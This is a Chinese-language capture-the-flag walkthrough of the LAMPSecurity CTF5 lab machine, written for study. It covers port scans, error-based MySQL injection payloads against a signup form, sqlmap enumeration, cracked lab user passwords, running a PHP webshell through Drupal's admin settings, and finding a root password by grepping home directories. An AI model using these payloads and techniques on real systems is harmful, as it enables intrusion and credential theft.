
# 靶机描述

_这是一台标榜难度为简单的开源靶机。  设计者鼓励测试人员用多种思路完成靶机。_    

![des](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-14_18_48_06.png)

# 信息收集

1. 主机发现
kali 的 IP 是 192.168.2.47。目标 IP 是 192.168.2.52。

2. 端口扫描
```
Nmap scan report for 192.168.2.52
Host is up (0.0023s latency).
Not shown: 990 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
143/tcp  open  imap
445/tcp  open  microsoft-ds
901/tcp  open  samba-swat
3306/tcp open  mysql
MAC Address: 00:0C:29:76:7F:C1 (VMware)
```

进行端口，运行版本的详细信息扫描

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)
| ssh-hostkey: 
|   1024 05:c3:aa:15:2b:57:c7:f4:2b:d3:41:1c:74:76:cd:3d (DSA)
|_  2048 43:fa:3c:08:ab:e7:8b:39:c3:d6:f3:a4:54:19:fe:a6 (RSA)
25/tcp   open  smtp        Sendmail 8.14.1/8.14.1
| smtp-commands: localhost.localdomain Hello [192.168.2.47], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP
|_ 2.0.0 This is sendmail 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))
|_http-title: Phake Organization
|_http-server-header: Apache/2.2.6 (Fedora)
110/tcp  open  pop3        ipop3d 2006k.101
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-04-29T11:31:53
|_Not valid after:  2010-04-29T11:31:53
|_ssl-date: 2026-08-12T09:56:23+00:00; -20h55m55s from scanner time.
|_pop3-capabilities: USER STLS LOGIN-DELAY(180) UIDL TOP
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100024  1          32768/udp   status
|_  100024  1          35924/tcp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
143/tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)
|_ssl-date: 2026-08-12T09:56:23+00:00; -20h55m55s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-04-29T11:31:53
|_Not valid after:  2010-04-29T11:31:53
|_imap-capabilities: LOGIN-REFERRALS IMAP4REV1 MAILBOX-REFERRALS NAMESPACE SASL-IR SORT LITERAL+ SCAN UIDPLUS WITHIN IDLE CAPABILITY OK STARTTLSA0001 completed THREAD=REFERENCES ESEARCH BINARY UNSELECT CHILDREN THREAD=ORDEREDSUBJECT MULTIAPPEND
445/tcp  open  netbios-ssn Samba smbd 3.0.26a-6.fc8 (workgroup: MYGROUP)
901/tcp  open  http        Samba SWAT administration server
| http-auth: 
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
3306/tcp open  mysql       MySQL 5.0.45
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.45
|   Thread ID: 6
|   Capabilities flags: 41516
|   Some Capabilities: Support41Auth, Speaks41ProtocolNew, SupportsTransactions, SupportsCompression, LongColumnFlag, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: QXE2jADp+"heB[#97G@H
MAC Address: 00:0C:29:76:7F:C1 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
Service Info: Hosts: localhost.localdomain, 192.168.2.52; OS: Unix

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a-6.fc8)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: localhost.localdomain
|_  System time: 2026-08-12T05:55:09-04:00
|_clock-skew: mean: -19h55m54s, deviation: 2h00m00s, median: -20h55m55s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

目标运行了 22，25，80，445，以及 3306 等端口。虽然开放了 smb 服务，但是没有可以利用的共享目录。

3. 漏洞脚本扫描
```
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
80/tcp   open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-trace: TRACE is enabled
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum: 
|   /info.php: Possible information file
|   /phpmyadmin/: phpMyAdmin
|   /squirrelmail/src/login.php: squirrelmail version 1.4.11-1.fc8
|   /squirrelmail/images/sm_logo.png: SquirrelMail
|   /icons/: Potentially interesting folder w/ directory listing
|_  /inc/: Potentially interesting folder
110/tcp  open  pop3
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
143/tcp  open  imap
445/tcp  open  microsoft-ds
901/tcp  open  samba-swat
3306/tcp open  mysql
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:76:7F:C1 (VMware)

Host script results:
|_smb-vuln-ms10-061: false
|_smb-vuln-ms10-054: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
```

漏洞脚本扫描暴露出了 80 端口开放的几个令人感兴趣的目录。

# WEB 渗透

打开后发现了这个界面

![WEB1](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-15_16_23_27.png)
点击网站栏目中的 Blog ，跳转到一个名叫 Nano CMS 的博客界面。

![WEB2](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-15_16_23_35.png)

点击 event 又跳转到了新的界面。

![WEB3](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-15_16_23_50.png)

在浏览界面的同时，我发现有个 mailing list 的链接。点击后发现了一个注册界面。由于注册功能通常是将表单的内容插入到数据库中，所以比较容易出现 SQL 注入攻击。我们这里简单试了一下，确实存在注入。

![WEB4](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-15_16_24_06.png)

![WEB5](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-15_16_36_24.png)


![WEB6](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-15_16_36_34.png)

由于不好找回显点，这里我们使用报错注入。

## SQL 报错注入 手工测试

关于手工注入，我参考了这个 [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based) 网站的这个
```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
```

我们先爆破网站所有数据库名。
```sql
' AND (SELECT * FROM (SELECT NAME_CONST((SELECT group_concat(schema_name) FROM information_schema.schemata),1),NAME_CONST((SELECT group_concat(schema_name) FROM information_schema.schemata),1)) as x) #
```

结果
![sql1](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-16-50-47.png)

我们感兴趣的是这个 drupal 数据库。information_schema和mysql 都是 mysql 软件的功能性数据库。而 contacts看名字像是网站样式的数据库。test 又是测试。只有 drupal 这是个 CMS 框架的名称。如果能够获得泄露的凭据信息。我们就可以登录网站后台，获得立足点。
通过这个 payload

```sql
' AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x) #
```

我们当前是在 contacts 数据库中。

```sql
' AND (SELECT * FROM (SELECT NAME_CONST((SELECT group_concat(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="drupal"),1),NAME_CONST((SELECT group_concat(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="drupal"),1)) as x) #
```

结果

![sql2](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-16-59-03.png)

这个 drupal 数据库的表看样子还是挺多的。group_concat 函数没法一次性全部列举完。那就只能使用 limit 参数一个个枚举。考虑到时间和效率这个因素。我们使用 sqlmap 来快速枚举完成。

## SQLmap 自动化枚举

先将当前请求数据头和 POST 提交的内容放在一个文件中，然后使用 sqlmap 的 -r 参数即可启动。
一下子我们就看到了我们最感兴趣的 user 表。
![sql3](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-14_14_52_51.png)

也可以使用 payload

```sql
' AND (SELECT * FROM (SELECT NAME_CONST((SELECT group_concat(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "users"),1),NAME_CONST((SELECT group_concat(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "users"),1)) as x) #
```

![sql4](../vulnhubScreenShot/lampsecurity-ctf5/20260815171150.png)

不过 sqlmap 给出的结果更加清晰完整。
![sql5](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-17-12-21.png)
进一步获得 账号密码凭据。

![sql6](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-17-14-49.png)

使用网页 hash 工具碰撞出明文密码。
```text
andy:b64406d23d480b88fe71755b96998a51:newdrupalpass
amy:e5f0f20b92f7022779015774e90ce917:temppass
patrick:5f4dcc3b5aa765d61d8327deb882cf99:password
loren:6c470dd4a0901d53f7ed677828b23cfd:lorenpass
```

## 获得立足点

在 sql 注入手工测试的时候，我们发现有个 drupal 框架的数据库。那么网站栏目中标志为 event 的 WEB 界面应该就是由 drupal 框架搭建而成的。刚刚获得的登录凭据应该就是这个 event 页面的凭据。希望这里面有一些高权限的用户。我们可以修改页面类型，运行我们自己的 php 代码。

这里的 patrick 用户凭据是网站后台管理员。

![stepone1](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-17-23-03.png)

我们点击这个 Administer 选项，进入其中的 Site configuration 栏目。点击其中 Input formats。
修改其中解析属性为 php code。

![stepone2](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-17-28-37.png)


接下来，我们新建一个 page 内容，记得勾选 php 解析器。点击 preview。页面就会解析我们的 php 木马内容。

![stepone3](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-17-35-07.png)

可以看到成功回连。

![stepone4](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-17-35-16.png)

成功获得立足点。

# 权限提升

首先查看一下当前服务器有哪些用户。
![root1](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-17-47-58.png)

当前用户还是比较多的。那很有可能某个用户为了方便私藏 root 凭据。我们重点关注 /home 目录下的文件。使用 grep 命令快速匹配搜索。

```shell
grep -R -i pass* /home/* 2>/dev/null
```

![root2](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-17-53-38.png)

我们发现输出中，有个 /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note 提到了 root 。我们查看一下这个文件。发现了 root 用户的凭据 50$cent

![root3](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-17-55-36.png)

成功提权。展示一下战利品。
![root4](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-17-55-52.png)


# 补充 信息泄露凭据 RCE

WEB 信息收集过程中，发现一个名叫 Nano CMS 的页面。使用 searchsploit 工具搜索利用。发现有个需要认证的 RCE 漏洞。
![exploit1](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-18-02-03.png)

我们使用 Google 搜索引擎搜索其他 exploit 脚本。使用 “NanoCMS exploit” 关键字搜索。发现了一个信息泄露的路径。

![exploit2](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-14_18_42_49.png)

![exploit3](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-14_18_44_07.png)

发现成功泄露凭据信息。

![exploit4](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-14_18_45_18.png)
使用网页 hash 碰撞工具进行破解。

![exploit5](../vulnhubScreenShot/lampsecurity-ctf5/Screenshot_2026-08-14_16_07_37.png)

使用这个 50997.py 脚本进行上传攻击。访问界面。触发木马，拿到立足点。

![exploit6](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-18-30-43.png)

![exploit7](../vulnhubScreenShot/lampsecurity-ctf5/KALI2026.2-2026-08-15-18-32-19.png)


# 总结

我们通过信息收集，发现目标网站的 list 目录下存在 SQL 注入。通过脚本和手工测试，获得 drupal 框架下的数据库用户凭据。通过密码喷洒获得了后台管理员权限。通过上传 WEBSHELL 木马获得了服务器的立足点。进行权限枚举时，发现当前系统有许多用户，猜测多用户会不会泄露 root 凭据。最后找到了泄露的凭据，成功获得 root 权限。拿下整台机子。